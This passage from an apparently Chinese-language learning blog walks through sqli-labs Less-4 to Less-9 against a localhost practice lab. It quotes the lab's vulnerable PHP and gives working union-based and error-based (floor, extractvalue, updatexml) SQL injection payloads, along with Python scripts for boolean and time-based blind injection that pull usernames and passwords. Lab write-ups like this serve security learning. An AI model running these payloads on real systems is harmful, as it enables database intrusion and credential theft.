class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//该代码的目的是在变量 $id 的值的前后添加双引号。</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27; union select 1,database(),version() --+&quot;)</span><br></pre></td></tr></table></figure><p><mark>存疑:</mark>为什么页面能够正确地返回id=1的信息而不报错？为什么不能执行union联合查询语句？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27;) union select 1,database(),version() --+&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload如下：在Less-3的基础上把-1后面的单引号改为双引号即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>​    在实际环境下，如果需要手工注入我怎么快速地知道注入闭合条件是什么呢？</p><ul><li>脚本遍历</li><li>获取源码（感觉难度较大，都获取到源码了）</li></ul><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><ul><li><input disabled type="checkbox"> python写一个遍历的程序打通这两关</li></ul><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><blockquote><p>Less-5 Double Query- Single Quotes- String</p></blockquote><h2 id="一、分析题目"><a href="#一、分析题目" class="headerlink" title="一、分析题目"></a>一、分析题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------确认为字符型注入--------------------</span><br></pre></td></tr></table></figure><p>有点意思，发现之前的模板语句注入后都只回显<code>You are in...........</code>，查看源码发现，只要查询结果正确就只返回<code>You are in...........</code>，应该算是盲注了？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本题：</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//之前做的题目：</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="二、盲注知识点"><a href="#二、盲注知识点" class="headerlink" title="二、盲注知识点"></a>二、盲注知识点</h2><p>盲注分类大致如此：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.7blrrw8yngo.png"></p><p>详情见此博文学习盲注：<a class="link" href="https://www.anquanke.com/post/id/266244#h3-3">点此处跳转<i class="fas fa-external-link-alt"></i></a></p><h2 id="三、布尔盲注和延时盲注WP"><a href="#三、布尔盲注和延时盲注WP" class="headerlink" title="三、布尔盲注和延时盲注WP"></a>三、布尔盲注和延时盲注WP</h2><p>​    这里布尔盲注的速度更快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:C2yb8er</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Boolean_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ-.@&amp;%/^!~&#x27;</span>:</span><br><span class="line">            <span class="comment"># url = &quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            <span class="comment"># url = &#x27;http://localhost/SQLlabs/Less-6/?id=1&quot; &#x27;</span></span><br><span class="line">            <span class="comment"># url = &quot;http://localhost/SQLlabs/Less-7/?id=1&#x27;)) &quot;</span></span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-8/?id=1&#x27; &quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr(database(), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(password) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># less-6</span></span><br><span class="line">            <span class="comment"># payload = f&quot;and BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># less-7</span></span><br><span class="line">            <span class="comment"># payload = f&quot;and BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># less-8</span></span><br><span class="line">            payload = <span class="string">f&quot;and BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; --+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Time_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ-.@&amp;%/^!~&#x27;</span>:</span><br><span class="line">            <span class="comment"># url = &quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            url = <span class="string">&#x27;http://localhost/SQLlabs/Less-10/?id=1&quot; &#x27;</span></span><br><span class="line">            payload = <span class="string">f&quot;and sleep(if(BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr(database(),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload=f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(password) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="四、报错注入"><a href="#四、报错注入" class="headerlink" title="四、报错注入"></a>四、报错注入</h2><blockquote><p>方法多如牛毛，这里只看看这几方面：</p></blockquote><h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3><blockquote><p>floor报错注入的原理是rand和order by或group by的冲突。</p></blockquote><p><mark>存疑：</mark>这里的username和password为什么不能直接用group_concat函数一次输出呢？为什么必须要得用limit限制才能一个一个输出呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--------------------查数据库名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------查表名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------查列名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------查username--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------查password--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select password from users limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure><h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h3><blockquote><p>有长度限制,最长32位<br>原理：xpath 函数报错注入</p></blockquote><p><mark>缺陷就是显示不完全！</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--------------------查数据库名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br><span class="line">--------------------后续同updatexml--------------------</span><br></pre></td></tr></table></figure><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><blockquote><p>有长度限制,最长32位</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--------------------查数据库名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br><span class="line">--------------------查表名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</span><br><span class="line">--------------------查列名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x7e),1)--+</span><br><span class="line">--------------------查username--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+</span><br><span class="line">--------------------查password--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><mark>缺陷就是显示不完全！</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.1xecdkis7www.png"></p><h2 id="五、后记-1"><a href="#五、后记-1" class="headerlink" title="五、后记"></a>五、后记</h2><p>​    这一道题花费时间较长，但是收获较大，初步入门了盲注和报错注入并且用python简化了流程。</p><p>​    在这里贴一点参考文章吧：</p><ul><li><p><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label0"><strong>SQL注入靶场sqli-labs 1-65关全部通关教程</strong></a></p></li><li><p><a class="link" href="https://blog.csdn.net/like98k/article/details/79646512">SQL注入之报错注入的一些随笔<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link" href="https://blog.csdn.net/rfrder/article/details/108674217">sqli-labs-Less5 关于各种报错注入的学习<i class="fas fa-external-link-alt"></i></a></p></li></ul><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><blockquote><p>Less-6 Double Query- Double Quotes- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>​    把less-5中<code>?id=1&#39;</code>改成<code>?id=1&quot;</code>就能过。</p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><blockquote><p>Less-7 Dump into Outfile</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--------------------试探--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-7/?id=1&#x27; and 1 = 1</span><br><span class="line">//经过试探我们发现页面返回如下：</span><br><span class="line">You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;)) LIMIT 0,1&#x27; at line 1</span><br><span class="line">//我们肯定确认有新的闭合条件：这里我们猜测为))</span><br><span class="line">--------------------构造形式如下--------------------</span><br><span class="line">?id=1&#x27;)) payload --+</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    同样的也是盲注，只不过改变了闭合条件，改变一下我们的py程序：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230705/St2iv8rimage.5ra403eucl00.png"></p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><blockquote><p>Less-8 Blind- Boolian- Single Quotes- String</p></blockquote><p>同Less-5，但是禁用了报错注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modified : Boolean_Blind_SQL_Attack()</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/SQLlabs/Less-8/?id=1&#x27; &quot;</span></span><br><span class="line">payload = <span class="string">f&quot;and BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; --+&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><blockquote><p>Less-9 Blind- Time based- Single Quotes- String</p></blockquote><p>有点奇怪，万能探测都能正常回显，查看源码发现罪魁祸首就是本题将无论你查询语句写的对不对都只回显<code>You are in...........</code>，这样就相当于禁用了报错注入和布尔盲注。所以这道题我们使用时间盲注。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span 